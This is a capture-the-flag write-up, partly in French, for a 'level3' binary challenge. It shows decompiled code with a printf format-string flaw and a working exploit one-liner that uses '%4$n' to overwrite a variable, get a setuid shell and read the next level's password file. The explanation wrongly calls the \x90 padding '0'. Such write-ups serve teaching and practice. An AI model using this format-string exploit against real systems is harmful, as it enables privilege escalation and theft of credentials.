Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2022(level3) gid=2022(level3) groups=2022(level3),100(users)
/home/user/level3
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level3 :

```
$ ./level3

```

Il ne répond qu'avec un input :

```
$ ./level3
da
da
```

J'utilise `Dogbolt` afin de décompiler le binaire du level 3.

### Ghidra

```c
void v(void) {
  char buffer[520];
  
  fgets(buffer,0x200,stdin);
  printf(buffer);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void) {
  v();
  return;
}
```

### Hexray

```c
int v() {
  int result; // eax
  char s[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(s, 512, stdin);
  printf(s);
  result = m;
  if ( m == 64 )
  {
    fwrite("Wait what?!\n", 1u, 0xCu, stdout);
    return system("/bin/sh");
  }
  return result;
}
```

Ici, il semble être question de modifier la valeur de `m` dans le code afin de passer le `if` et ouvrir un shell.






in the source, we need to overwrite m to be equal to 64,  so that it passes the cmp

(python -c 'print("\x08\x04\x98\x8c"[::-1] + "\x90"*(64-4) + "%4$n")' && echo 'cat /home/user/level4/.pass') | ./level3
"Since we need to write 64 into m, we write 64 characters (4 from the address of m and 60 from the "0" padding). Then, we use the %n format specifier to record the count of bytes written so far into the fourth argument, which is m's address."

https://owasp.org/www-community/attacks/Format_string_attack